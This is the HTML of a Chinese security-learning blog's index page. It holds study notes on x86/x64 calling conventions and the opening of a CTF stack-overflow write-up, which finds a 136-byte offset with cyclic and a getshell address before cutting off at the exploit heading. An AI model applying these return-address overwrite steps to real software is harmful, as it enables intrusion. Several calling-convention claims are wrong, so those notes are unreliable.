@@ -1,0 +1,1455 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-bounce.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"hide","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":true,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta property="og:type" content="website">
+<meta property="og:title" content="STERIA LAB">
+<meta property="og:url" content="http://example.com/page/2/index.html">
+<meta property="og:site_name" content="STERIA LAB">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="STEVE">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/page/2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>STERIA LAB</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">STERIA LAB</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">for STEVE</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content index posts-expand">
+            
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/21/%E6%98%9F%E7%9B%9Fpwn%E5%85%A5%E9%97%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="STEVE">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="STERIA LAB">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/06/21/%E6%98%9F%E7%9B%9Fpwn%E5%85%A5%E9%97%A8/" class="post-title-link" itemprop="url">星盟pwn入门</a>
+        </h2>
+
+        <div class="post-meta">
+
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-06-21 22:22:24" itemprop="dateCreated datePublished" datetime="2021-06-21T22:22:24+08:00">2021-06-21</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-08-24 17:04:56" itemprop="dateModified" datetime="2021-08-24T17:04:56+08:00">2021-08-24</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>课程来源 <code>https://www.bilibili.com/video/BV1Uv411j7fr/?spm_id_from=333.788.recommend_more_video.-1</code></p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/06/21/%E6%98%9F%E7%9B%9Fpwn%E5%85%A5%E9%97%A8/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/18/%E7%AE%80%E5%8D%95%E7%BB%93%E6%9E%84%E7%9A%84%E6%B1%87%E7%BC%96/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="STEVE">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="STERIA LAB">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/06/18/%E7%AE%80%E5%8D%95%E7%BB%93%E6%9E%84%E7%9A%84%E6%B1%87%E7%BC%96/" class="post-title-link" itemprop="url">简单结构的汇编</a>
+        </h2>
+
+        <div class="post-meta">
+
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-06-18 22:33:44" itemprop="dateCreated datePublished" datetime="2021-06-18T22:33:44+08:00">2021-06-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-07-12 01:19:40" itemprop="dateModified" datetime="2021-07-12T01:19:40+08:00">2021-07-12</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/" itemprop="url" rel="index"><span itemprop="name">汇编语言</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="x86函数调用约定"><a href="#x86函数调用约定" class="headerlink" title="x86函数调用约定"></a>x86函数调用约定</h2><blockquote>
+<p><code>int function(int a, int b)</code></p>
+</blockquote>
+<ul>
+<li>在参数传递中需要说明:<ul>
+<li>当参数个数多余一个的时候,按照什么顺序把参数压入堆栈</li>
+<li>函数调用后,由谁来把堆栈恢复原装</li>
+</ul>
+</li>
+<li>在高级语言中,通过函数调用约定来说明这两个问题,常见的调用约定<ul>
+<li>stdcall</li>
+<li>cdecl</li>
+<li>fastcall</li>
+<li>thiscall</li>
+<li>naked call</li>
+</ul>
+</li>
+</ul>
+<h3 id="stdcall调用约定"><a href="#stdcall调用约定" class="headerlink" title="stdcall调用约定"></a>stdcall调用约定</h3><ul>
+<li><p>stdcall很多时候被称为pascal调用约定,因为pascal使用的函数的调用约定就是stdcall,在Microsoft C++系列的C/C++编译器中,常常用PASCAL宏来声明这个调用约定,类似的宏还有WINAPI和CALLBACK</p>
+</li>
+<li><p>stdcal调用声明约定的语法为</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __stdcall <span class="title">function</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>stdcall调用约定意味着:</p>
+<ol>
+<li>调用函数时参数从右向左压入堆栈</li>
+<li>被调用函数自身修改堆栈</li>
+<li>被调用函数函数名自动加前导的下划线,后面紧跟一个@符号,其后紧跟参数的尺寸</li>
+</ol>
+</li>
+<li><p>转换成汇编(eg 调用<code>function(a, b)</code>)</p>
+<ul>
+<li><p>调用函数:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push b  //从右向左入栈,所以先压入b</span><br><span class="line">push a</span><br><span class="line">call function</span><br></pre></td></tr></table></figure></li>
+<li><p>被调用函数:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">push ebp   //保存ebp,注意栈向低地址生长</span><br><span class="line">mov ebp, esp   //调用函数的esp,即被调用函数的ebp</span><br><span class="line">mov eax, [ebp+8H]   //此时的栈从ebp(esp)开始依次是,调用函数的ebp,调用函数的返回地址,参数a,参数b(地址从小到大), 此时[ebp+8H],指向参数a,用eax做返回值</span><br><span class="line">add eax, [ebp+0CH]  //[ebp+0CH]指向参数b,加给eax,实现了a+b</span><br><span class="line">mov esp, ebp  //返回的时候,由函数自己修改堆栈,这里是还原调用函数的esp(这里是被调用函数的栈底)</span><br><span class="line">pop ebp		//还原调用函数的栈底</span><br><span class="line">ret 8  //清理堆栈,然后pop eip</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>这里function的函数名编译的时候被翻译成_function@8  (这里一个参数为dword, 两个参数占8个字节)</p>
+</li>
+<li><p>注意取参数的时候是用相对于ebp的偏移来存取的</p>
+</li>
+<li><p>最后<code>ret 8</code>表示清理8个字节的堆栈(清理被调用函数的参数),函数自己恢复了堆栈</p>
+</li>
+</ul>
+<h3 id="cdecl调用约定"><a href="#cdecl调用约定" class="headerlink" title="cdecl调用约定"></a>cdecl调用约定</h3><ul>
+<li><p>cdecl调用约定又称为C调用约定,是C语言缺省的调用约定,定于语法为</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">function</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>明确定义:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">function</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>cdecl调用约定:</p>
+<ol>
+<li>调用函数时参数从右向左压入堆栈</li>
+<li>被调用函数本身不清理堆栈,由调用函数清理</li>
+<li>编译的时候在函数名前加前导的下划线<ul>
+<li>注意由于是用调用函数清理堆栈,所以被调用函数本身的参数个数可以不固定</li>
+<li>因为参数从右向左压入栈中,所以第一个参数肯定是最靠近栈顶的,因此当采用不定个数参数的时候,第一个参数在栈中的位置肯定可以知道,只要不定参数的个数,能够由第一个参数或者后续明确的参数确定,就可以采用不定参数</li>
+</ul>
+</li>
+</ol>
+</li>
+<li><p>转换成汇编</p>
+<ul>
+<li><p>调用参数:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push b   //从右向左入栈</span><br><span class="line">push a</span><br><span class="line">call function   //调用函数</span><br><span class="line">add esp, 8    //由调用函数恢复堆栈</span><br></pre></td></tr></table></figure></li>
+<li><p>被调用函数:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">mov ebp, esp</span><br><span class="line">mov eax, [ebp+8H]</span><br><span class="line">add eax, [ebp+0CH]</span><br><span class="line">mov esp, ebp</span><br><span class="line">pop ebp</span><br><span class="line">ret  //注意这里没有修改堆栈</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>函数名在符号表中被记作:<strong>_function</strong></p>
+</li>
+</ul>
+<h3 id="fastcall调用约定"><a href="#fastcall调用约定" class="headerlink" title="fastcall调用约定"></a>fastcall调用约定</h3><ul>
+<li>fastcall调用约定:<ol>
+<li>调用函数时被调用函数的第一个和第二个dword参数(或者更小的)通过ecx和edx转递</li>
+<li>其他参数通过从右往左的顺序压栈</li>
+<li>由被调用函数清理堆栈</li>
+<li>函数名修改规则同stdcall</li>
+</ol>
+</li>
+</ul>
+<h3 id="thiscall调用约定"><a href="#thiscall调用约定" class="headerlink" title="thiscall调用约定"></a>thiscall调用约定</h3><ul>
+<li>thiscall调用约定是唯一一个不能明确指明的函数修饰,因为thiscall不是关键字,是C++类成员函数缺省的调用约定,由于成员函数调用还有一个this指针,因此必须特殊处理:<ol>
+<li>参数从右往左入栈</li>
+<li>如果参数的个数确定,this指针通过exc传递给被调用者;如果参数个数不确定,this指针在所有参数压栈后被压入堆栈</li>
+<li>对参数个数不确定的调用者清理堆栈,否则函数自己清理堆栈</li>
+</ol>
+</li>
+<li>参数个数固定的情况下,类似于stdcall,参数个数不定的情况下,类似cdecl</li>
+</ul>
+<h3 id="nakedcall调用约定"><a href="#nakedcall调用约定" class="headerlink" title="nakedcall调用约定"></a>nakedcall调用约定</h3><ul>
+<li><p>nakedcall调用约定很少见,一般程序设计建议不要使用,编译器不会给这种函数增加初始化和清理代码,同时,不能哟个return返回返回值,需要插入汇编返回结果,一般用于实模式驱动程序设计</p>
+</li>
+<li><p>这个修饰适合__stdcall以及cdecl结合使用</p>
+<ul>
+<li><p>与__stdcall结合</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__declspec(naked) <span class="function"><span class="keyword">int</span> __stdcall <span class="title">function</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm mov eax, a</span><br><span class="line">    __asm add eax, b</span><br><span class="line">    __asm ret <span class="number">8</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>汇编(被调用函数):</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eax, [ebp+8]</span><br><span class="line">add eax, [ebp+12]</span><br><span class="line">ret 8</span><br></pre></td></tr></table></figure></li>
+<li><p>与cdecl结合</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__declspec(naked) <span class="function"><span class="keyword">int</span> __stdcall <span class="title">function</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm mov eax, a</span><br><span class="line">    __asm add eax, b</span><br><span class="line">    __asm ret</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>汇编(被调用函数):</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eax, [ebp+8]</span><br><span class="line">add eax, [ebp+12]</span><br><span class="line">ret</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>这种函数调用约定,在函数被调用的时候,和普通的cdecl和stdcall相同</p>
+</li>
+</ul>
+<h2 id="x64函数调用约定"><a href="#x64函数调用约定" class="headerlink" title="x64函数调用约定"></a>x64函数调用约定</h2><ul>
+<li>x64架构相比x86架构主要是将所有原来的寄存器扩大了一倍eax扩充成rax,同时形成了R8~R15这8个64位寄存器</li>
+<li>x64下的调用约定只有一种就是<strong>fastcall</strong>,但是Windows和Linux下有所不同</li>
+</ul>
+<h3 id="Windows下的x64调用约定"><a href="#Windows下的x64调用约定" class="headerlink" title="Windows下的x64调用约定"></a>Windows下的x64调用约定</h3><ul>
+<li>Windows的x64下只有一种函数调用约定,即__fastcall,其他调用约定的关键字会被忽略</li>
+<li>一个函数在调用的时候,前四个参数从左至右,依次放入RCX,RDX,R8,R9寄存器中,剩下的参数通过栈传递,从右至左依次入栈</li>
+<li>如果是浮点类型的参数,从左到右由XMM0,XMM1,XMM2,XMM3依次传递,然后剩下的参数通过栈传递,从右到左顺序入栈</li>
+<li>调用函数负责在栈上分配32字节的”shadow space”,用于存放那四个调用参数寄存器的值(前四个调用参数)</li>
+<li>小于64位(bit)的参数传递时高位不填充零,如果时结构体或者union如果大小位1,2,4,8字节用值传递,大样图8字节必须按照地址(指针传递)</li>
+<li>被调用函数的返回值时64位以内(包括64位)的整形或指针时,返回值会被存放在RAX</li>
+<li>如果返回值时浮点型,则返回值存放在XMM0</li>
+<li>更大的返回值,比如结构体,由调用函数在栈上分配空间,并由RCX持有该空间的指针并传递给被调用函数,因此整型参数使用的寄存器依次右移一个实际可利用的寄存器位RDX, R8, R9三个寄存器,其余参数通过栈传递,函数调用结束后,RAX返回空间的指针,即函数调用开始时RCX的值</li>
+<li>调用函数负责清理栈,被调用函数不用清理栈</li>
+<li>除了RCX,RDX,R8,R9以外, RAX,R10,R11和XMM5,XMM6也是”易挥发的”不用特别保护,其余寄存器需要保护,(x86下只有eax, ecx, edx是易挥发的)</li>
+<li>栈需要16字节对齐,call指令会入栈一个8字节的函数返回地址,这样一来栈就对不齐了,(因为RCX,RDX,R8,R9四个寄存器刚好是32个字节,是16字节对齐的,多出来了8个字节)所以所有非叶子节点调用的函数,都必须调整RSP的地址位16n+8,来使栈对齐</li>
+<li>对于R8~R15 的寄存器,我们可以使用r8,r8d,r8w,r8b来分别代表,r8寄存器的64位, 低32位, 低16位和低8位</li>
+<li>x64下系统会为main函数开辟一个很大的栈区,但是main函数并未消耗掉这么大的栈区空间,这个时候,子函数就会继续利用main函数的预留的栈区空间,所以main函数或者其他被main函数调用的函数,并不会对子函数的栈区空间进行清理</li>
+</ul>
+<h3 id="Linux下的x64调用约定"><a href="#Linux下的x64调用约定" class="headerlink" title="Linux下的x64调用约定"></a>Linux下的x64调用约定</h3><ul>
+<li>LInux下的调用约定叫做”System V AMD64 ABI”,此约定主要是在Solaris,GNU/Linux, FreeBSD和其他非微软OS上使用</li>
+<li>Linux的x64下也只有__fastcall调用约定,其他关键字都会被忽略</li>
+<li>一个函数在调用的时候,如果参数个数小于等于6个时,前6个参数时从左至右依次存放于RDI, RSI, RDX, RCX, R8, R9寄存器,剩下的参数通过栈传递,从右至左顺序入栈</li>
+<li>如果参数的个数大于6个时前五个参数是从左至右依次存放于RDI,RSI,RDX,RCX,RAX寄存器里,剩下的参数通过栈传递,从右向左依次入栈</li>
+<li>对于系统调用用R10代替RCX</li>
+<li>XMM0~XMM7用于传递浮点参数</li>
+<li>小于64位(bit)的参数传递时高位不填充零,如果时结构体或者union如果大小位1,2,4,8字节用值传递,大样图8字节必须按照地址(指针传递)</li>
+<li>被调用函数的返回值是64为以内的整型或指针时,返回值会被存放在RAX,如果返回值时128为的则高64位放入RDX</li>
+<li>如果返回值时浮点型,放在XMM0</li>
+<li>更大的返回值,由调用方在栈上分配空间,并由RCX持有该空间的指针并传递给被调用函数因此 ,整型参数使用的寄存器依次右移一个,实际只可以利用RDI,RSI,RDX,R8,R9 5个寄存器,其余参数通过栈传递,函数调用结束后,RAX返回该控件的指针(即函数调用开始时的RCX的值)</li>
+<li>可选的, 被调用函数推入RBP,以使caller-return-rip在其上方8个字节,并将RBP设置为已经保存的RBP地址,这允许遍历现有堆栈帧通过指令GCC的-fomit-frame-pointer选项可以消除此问题</li>
+<li>调用者清理栈,被调用函数不需要清理栈</li>
+<li>除了RDI,RSI,RDX,RCX,R8,R9意外RAX,R10,R11也是易挥发的不需要特别保护,其余寄存器需要保护</li>
+<li>在调用call指令之前,必须保证堆栈是16字节对齐的</li>
+<li>对于R8~R15 的寄存器,我们可以使用r8,r8d,r8w,r8b来分别代表,r8寄存器的64位, 低32位, 低16位和低8位</li>
+</ul>
+<h2 id="printf函数"><a href="#printf函数" class="headerlink" title="printf函数"></a>printf函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>注意到相同的程序,用windows和linux两个系统编译的可执行文件,反编译得到的结果不同(Windows 10 MinGW和ubuntu18 gcc)<ul>
+<li>装载的库不同</li>
+<li>反编译后的汇编也不同</li>
+</ul>
+</li>
+</ul>
+<p><strong>linux:</strong></p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="keyword">mov</span>     <span class="built_in">rbp</span>, <span class="built_in">rsp</span></span><br><span class="line"><span class="keyword">lea</span>     <span class="built_in">rdi</span>, format     <span class="comment">; &quot;hello world!&quot;</span></span><br><span class="line"><span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">call</span>    _printf</span><br><span class="line"><span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">pop</span>     <span class="built_in">rbp</span></span><br><span class="line"><span class="keyword">retn</span></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/18/%E6%A0%88%E6%BA%A2%E5%87%BA/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="STEVE">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="STERIA LAB">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/05/18/%E6%A0%88%E6%BA%A2%E5%87%BA/" class="post-title-link" itemprop="url">栈溢出</a>
+        </h2>
+
+        <div class="post-meta">
+
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-05-18 18:56:44 / 修改时间：19:23:46" itemprop="dateCreated datePublished" datetime="2021-05-18T18:56:44+08:00">2021-05-18</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/writeups/" itemprop="url" rel="index"><span itemprop="name">writeups</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/writeups/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="All-se"><a href="#All-se" class="headerlink" title="All_se"></a>All_se</h2><ol>
+<li><p>环境: Ubuntu18 pwndbg</p>
+</li>
+<li><p>查看保护</p>
+<p> <img src="1.png" alt="checksec"></p>
+</li>
+<li><p>动调</p>
+<ol>
+<li><code>run</code>发现程序输出<code>Hello,world</code> 然后输入</li>
+<li><code>break main</code>在main函数设置断点,<code>ni</code>步过,<code>si</code>步入vulnerable_function,发现有一个read函数,可以构造栈溢出</li>
+<li><code>cyclic 200</code>然后输入,发现返回地址被覆盖为<code>jaab</code>,<code>cyclic -l jaab</code>可以得到缓冲区136字节</li>
+<li>静调可以找到一个getshell函数,得到返回地址<code>0x400320</code></li>
+</ol>
+</li>
+<li><p>exp</p>
